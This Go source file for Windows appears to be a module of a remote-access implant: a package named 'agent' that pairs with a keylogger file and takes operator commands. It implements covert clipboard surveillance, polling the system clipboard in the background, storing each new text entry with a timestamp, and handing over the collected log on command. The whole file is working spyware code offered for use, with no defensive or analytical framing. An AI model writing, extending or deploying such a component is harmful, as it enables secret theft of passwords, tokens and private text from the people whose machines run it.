//go:build windows

package agent

// Clipboard monitor — polls the system clipboard at a configurable interval
// and records each new text entry. Entries are retrieved with CLIP_MONITOR_DUMP
// and cleared on CLIP_MONITOR_STOP.
//
// CLIP_GET (already in commands.go) performs a single one-shot read.
// CLIP_MONITOR_START begins background polling.
// CLIP_MONITOR_DUMP returns all collected entries since start.
// CLIP_MONITOR_STOP halts monitoring and returns the log.

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modUser32clip          = windows.NewLazySystemDLL("user32.dll")
	procOpenClipboard      = modUser32clip.NewProc("OpenClipboard")
	procCloseClipboard     = modUser32clip.NewProc("CloseClipboard")
	procIsClipboardFormatAvailable = modUser32clip.NewProc("IsClipboardFormatAvailable")
	// procGetClipboardData, procGlobalLock, procGlobalUnlock declared in keylog_windows.go
)

const CF_UNICODETEXT = 13

var (
	clipMonMu      sync.Mutex
	clipMonRunning bool
	clipMonStop    chan struct{}
	clipMonLog     []clipEntry
)

type clipEntry struct {
	ts   time.Time
	text string
}

// clipboardGetText reads the current clipboard text (one-shot).
func clipboardGetText() (string, error) {
	r, _, e := procOpenClipboard.Call(0)
	if r == 0 {
		return "", fmt.Errorf("OpenClipboard: %w", e)
	}
	defer procCloseClipboard.Call()

	r, _, _ = procIsClipboardFormatAvailable.Call(CF_UNICODETEXT)
	if r == 0 {
		return "", nil
	}
	h, _, e := procGetClipboardData.Call(CF_UNICODETEXT)
	if h == 0 {
		return "", fmt.Errorf("GetClipboardData: %w", e)
	}
	p, _, _ := procGlobalLock.Call(h)
	if p == 0 {
		return "", fmt.Errorf("GlobalLock failed")
	}
	defer procGlobalUnlock.Call(h)

	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(p))), nil
}

// startClipMonitor begins background clipboard polling every intervalSec seconds.
func startClipMonitor(intervalSec int) (string, error) {
	clipMonMu.Lock()
	defer clipMonMu.Unlock()

	if clipMonRunning {
		return "", fmt.Errorf("clipboard monitor already running; use CLIP_MONITOR_DUMP to retrieve data")
	}
	if intervalSec <= 0 {
		intervalSec = 5
	}

	clipMonStop = make(chan struct{})
	clipMonLog = nil
	clipMonRunning = true
	var lastText string

	go func() {
		t := time.NewTicker(time.Duration(intervalSec) * time.Second)
		defer t.Stop()
		for {
			select {
			case <-clipMonStop:
				return
			case <-t.C:
				text, err := clipboardGetText()
				if err != nil || text == "" || text == lastText {
					continue
				}
				lastText = text
				clipMonMu.Lock()
				clipMonLog = append(clipMonLog, clipEntry{ts: time.Now(), text: text})
				clipMonMu.Unlock()
			}
		}
	}()

	return fmt.Sprintf("[+] clipboard monitor started (interval=%ds)", intervalSec), nil
}

// dumpClipMonitor returns all collected clipboard entries without stopping.
func dumpClipMonitor() string {
	clipMonMu.Lock()
	defer clipMonMu.Unlock()
	return formatClipLog(clipMonLog)
}

// stopClipMonitor halts monitoring and returns the full log.
func stopClipMonitor() string {
	clipMonMu.Lock()
	defer clipMonMu.Unlock()

	if !clipMonRunning {
		return "[-] clipboard monitor not running"
	}
	close(clipMonStop)
	clipMonRunning = false
	result := formatClipLog(clipMonLog)
	clipMonLog = nil
	return result
}

func formatClipLog(entries []clipEntry) string {
	if len(entries) == 0 {
		return "[clipboard monitor] no entries captured"
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[clipboard monitor] %d entries:\n", len(entries)))
	for i, e := range entries {
		preview := e.text
		if len(preview) > 200 {
			preview = preview[:200] + "…"
		}
		sb.WriteString(fmt.Sprintf("[%d] %s\n%s\n---\n", i+1,
			e.ts.Format("2006-01-02 15:04:05"),
			preview))
	}
	_ = syscall.EINVAL // ensure syscall import is used
	return sb.String()
}
